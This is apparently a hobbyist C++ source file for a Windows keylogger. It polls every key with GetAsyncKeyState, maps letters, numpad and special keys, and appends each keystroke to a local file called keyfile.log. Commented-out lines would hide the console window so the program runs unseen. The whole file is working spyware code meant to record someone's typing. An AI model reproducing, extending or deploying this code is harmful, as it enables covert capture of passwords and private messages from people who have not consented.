//#define _WIN32_WINNT 0x0500
#include <Windows.h>//FOR SLEEP SPECIAL KEYS AND GETASYNKEYSTATE
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream> // FOR COUT CIN
#include <fstream> //FOR WRITE IN A FILE

using namespace std;


void writeLog(int ckey)
{
    ofstream keyloggerSaveFile;
    keyloggerSaveFile.open("keyfile.log", ofstream::app);

    if (keyloggerSaveFile.is_open())
    {
        keyloggerSaveFile << char(ckey);
        keyloggerSaveFile.close();
    }
}

void writeSpecialLog(string keyInput)
{
    ofstream keyloggerSaveFile;
    keyloggerSaveFile.open("keyfile.log", ofstream::app);

    if (keyloggerSaveFile.is_open())
    {
        keyloggerSaveFile << keyInput;
        keyloggerSaveFile.close();
    }//NO NEED A ELSE STATMENT BECAUSE THE FILE  WILL BE CREATE IN ANY CASE
}

bool specialKeys(int sKey)
{
    switch (sKey)

    {
    /*
    IF U WANT TO TRACK OTHERE VIRTUAL KEY !
    https://msdn.microsoft.com/en-us/library/ms927178.aspx
    */
    case VK_RETURN:
        //cout << "\n" << endl;
        writeSpecialLog("\n");
        return true;
        break;

    case VK_TAB:
        //cout << "TAB" << endl;
        writeSpecialLog("\t");
        return true;
        break;

    case VK_BACK:
        cout << "#back#" << endl;
        writeSpecialLog("#BACK#");
        return true;
        break;

    case VK_NUMLOCK:
        cout << "#VerrNum#" << endl;
        writeSpecialLog("#verNum#");
        return true;
        break;

    default:
        return false;
    }
}



int main()
{
    //FreeConsole();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);//Hide windows
    while (true)
    {
        Sleep(10);//INFINITE SLEEP FOR ACTIVE WINDOWS
        for (int key = 8; key <= 255; key++)//PUT 127 IF U WANT MINIMAL KEY
            //WE START AT BACKSPACE WHO IS 8 IN THE ASCII CODE
        {
            if ((GetAsyncKeyState(key) == -32767) && (specialKeys(key) == false))//IF A TOUCH IS PRESS
            {
                //SSSSWWWIIITTTCCCCCCHH
                if((key>64)&&(key<91)&&!(GetKeyState(VK_CAPITAL)))
                    //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
                {
                    key+=32;
                    writeLog(key);


                }
                else if((key>64)&&(key<91))
                    //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
                {
                    writeLog(key);

                }


                else if ((key>95)&&(key<106)&&(GetKeyState(VK_NUMLOCK)))
                {
                    //cout << key << endl;
                    key-=48;//ON THE ASCII TABLE THE DIFFERENCE IS 47
                    writeLog(key);
                }
                else if ((key == 110)&&(GetKeyState(VK_NUMLOCK)))
                {
                    key-=64;
                    writeLog(key);

                }
                else if ((key == 46)&&!(GetKeyState(VK_NUMLOCK)))
                {
                    writeSpecialLog("#BACK#");
                }
                else if (key == 111)
                {
                    //64
                    writeSpecialLog("/");
                }
                else if (key == 106)
                {
                    //64
                    writeSpecialLog("*");
                }
                else if (key == 109)
                {
                    //62
                    writeSpecialLog("-");
                }

                else if (key == 107)
                {
                    //64
                    writeSpecialLog("+");
                }
                else
                {
                    cout << key << endl;
                }

            }
        }
    }

    return 0;
}
